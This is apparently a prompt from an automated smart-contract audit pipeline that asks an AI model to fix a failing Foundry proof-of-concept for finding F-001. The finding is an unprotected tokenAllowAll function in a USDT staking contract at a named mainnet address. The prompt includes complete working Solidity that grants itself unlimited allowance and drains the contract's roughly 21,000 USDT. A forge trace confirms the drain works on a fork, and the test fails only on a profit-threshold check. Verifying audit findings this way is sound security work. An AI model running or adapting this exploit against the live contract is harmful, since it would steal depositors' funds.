You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Anyone can grant themselves unlimited allowance over tokens held by the contract
- claim: `tokenAllowAll` is publicly callable and has no access control, so any account can set `uint256(-1)` allowance from the contract to an arbitrary `allowee` for any ERC20 `asset`. Because the staking pool holds USDT, an attacker can approve themselves and then drain the contract with `transferFrom`.
- impact: Any external user can steal all USDT held by the staking contract, including deposited principal and any prefunded rewards. Any other ERC20 sent to the contract is also drainable.
- exploit_paths: ["Attacker calls `tokenAllowAll(USDT, attacker)`.", "The contract grants the attacker unlimited USDT allowance.", "Attacker calls `USDT.transferFrom(address(contract), attacker, USDT.balanceOf(address(contract)))` to drain the pool."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IUSDTStakingContract28 {
    function tokenAllowAll(address asset, address allowee) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    uint256 private _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        IERC20Like usdt = IERC20Like(USDT);

        uint256 balanceBefore = usdt.balanceOf(address(this));
        uint256 targetBalanceBefore = usdt.balanceOf(TARGET);
        require(targetBalanceBefore > 0, "no USDT in target");

        // exploit_paths[0]: attacker calls `tokenAllowAll(USDT, attacker)`.
        // The verifier is the attacker, so `attacker` in the finding maps to `address(this)` here.
        IUSDTStakingContract28(TARGET).tokenAllowAll(USDT, address(this));

        // exploit_paths[1]: the contract grants the attacker unlimited USDT allowance.
        uint256 grantedAllowance = usdt.allowance(TARGET, address(this));
        require(grantedAllowance >= targetBalanceBefore, "allowance not granted");

        // exploit_paths[2]: attacker calls
        // `USDT.transferFrom(address(contract), attacker, USDT.balanceOf(address(contract)))`
        // to drain the pool. `address(contract)` is `TARGET` and `attacker` is `address(this)`.
        _safeTransferFrom(USDT, TARGET, address(this), targetBalanceBefore);

        uint256 balanceAfter = usdt.balanceOf(address(this));
        require(balanceAfter > balanceBefore, "no profit realized");
        _profitAmount = balanceAfter - balanceBefore;
    }

    function profitToken() external pure returns (address) {
        return USDT;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", from, to, amount));
        require(ok, "transferFrom call failed");
        if (data.length > 0) {
            require(abi.decode(data, (bool)), "transferFrom returned false");
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 796.20ms
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 142865)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 20999916289
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 20999916289
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xdAC17F958D2ee523a2206206994597C13D831ec7
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 11075

Traces:
  [142865] FlawVerifierTest::testExploit()
    ├─ [183] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xdAC17F958D2ee523a2206206994597C13D831ec7
    ├─ [5031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [99698] FlawVerifier::executeOnOpportunity()
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [3031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017) [staticcall]
    │   │   └─ ← [Return] 20999916289 [2.099e10]
    │   ├─ [30402] 0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017::tokenAllowAll(0xdAC17F958D2ee523a2206206994597C13D831ec7, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   ├─ [3356] 0xdAC17F958D2ee523a2206206994597C13D831ec7::allowance(0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [1356] 0xdAC17F958D2ee523a2206206994597C13D831ec7::allowance(0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [22953] 0xdAC17F958D2ee523a2206206994597C13D831ec7::approve(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │        topic 1: 0x000000000000000000000000800cfd4a2ba8ce93ea2cc814fce26c3635169017
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ [1356] 0xdAC17F958D2ee523a2206206994597C13D831ec7::allowance(0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    │   ├─ [35630] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transferFrom(0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 20999916289 [2.099e10])
    │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │        topic 1: 0x000000000000000000000000800cfd4a2ba8ce93ea2cc814fce26c3635169017
    │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │           data: 0x00000000000000000000000000000000000000000000000000000004e3b14b01
    │   │   └─ ← [Stop]
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 20999916289 [2.099e10]
    │   └─ ← [Return]
    ├─ [183] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xdAC17F958D2ee523a2206206994597C13D831ec7
    ├─ [308] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 20999916289 [2.099e10]
    ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 20999916289 [2.099e10]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 20999916289 [2.099e10])
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 20999916289 [2.099e10])
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xdAC17F958D2ee523a2206206994597C13D831ec7)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 17696562 [1.769e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 11075 [1.107e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.13s (375.64ms CPU time)

Ran 1 test suite in 3.15s (3.13s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 142865)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
